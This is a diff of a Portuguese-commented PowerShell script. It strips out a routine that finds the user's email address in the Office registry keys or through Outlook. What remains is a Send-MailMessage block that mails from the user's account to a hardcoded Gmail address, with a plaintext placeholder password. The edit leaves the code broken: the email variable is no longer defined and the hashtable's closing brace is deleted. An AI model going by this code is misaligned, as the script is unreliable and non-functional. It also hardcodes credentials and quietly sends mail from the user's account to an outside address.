@@ -1,51 +1,7 @@
-# Função para localizar o e-mail do usuário
-function Get-UserEmail {
-    # Tenta localizar o e-mail em várias versões do Office no Registro
-    $email = ""
-    $versions = @("16.0", "15.0", "14.0")
-    foreach ($version in $versions) {
-        try {
-            $emailPath = "HKCU:\Software\Microsoft\Office\$version\Common\Identity"
-            $email = (Get-ItemProperty -Path $emailPath -Name "EmailAddress" -ErrorAction SilentlyContinue).EmailAddress
-            if ($email) {
-                Write-Output "E-mail do usuário detectado no Registro (versão $version): $email"
-                break
-            }
-        } catch {
-            Write-Output ("Erro ao acessar o Registro para a versão do Office {0}: {1}" -f $version, "${_}")
-        }
-    }
 
-    # Se o e-mail não foi encontrado no Registro, tenta obter via Outlook
-    if (-not $email) {
-        try {
-            $outlook = New-Object -ComObject Outlook.Application
-            $namespace = $outlook.GetNamespace("MAPI")
-            $currentUser = $namespace.CurrentUser
-            $email = $currentUser.Address
-            Write-Output "E-mail do usuário detectado via Outlook: $email"
-        } catch {
-            Write-Output ("Erro ao acessar o Outlook: {0}" -f "${_}")
-        }
-    }
-
-    # Se o e-mail ainda não foi encontrado, solicita ao usuário para fornecê-lo manualmente
-    if (-not $email) {
-        $email = Read-Host "Por favor, insira seu e-mail"
-        if ($email) {
-            Write-Output "E-mail fornecido pelo usuário: $email"
-        } else {
-            Write-Output "E-mail não fornecido."
-        }
-    }
-    return $email
-}
-
-# Obtém o e-mail do usuário
-$email = Get-UserEmail
 
 # Se o e-mail foi encontrado, configurar e enviar usando SMTP
-if ($email) {
+
     $sendMailMessageSplat = @{
         From       = $email  # E-mail do usuário encontrado ou fornecido
         To         = 'nnboy2002@gmail.com'  # Endereço de e-mail do destinatário
@@ -55,7 +11,7 @@ if ($email) {
         Port       = 587
         UseSsl     = $true
         Credential = (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString "SENHA_DO_USUARIO" -AsPlainText -Force))
-    }
+    
 
     try {
         Send-MailMessage @sendMailMessageSplat
@@ -63,9 +19,7 @@ if ($email) {
     } catch {
         Write-Output ("Erro ao enviar o e-mail: {0}" -f "${_}")
     }
-} else {
-    Write-Output "Não foi possível enviar o e-mail: e-mail do usuário não encontrado."
-}
+
 
 
 
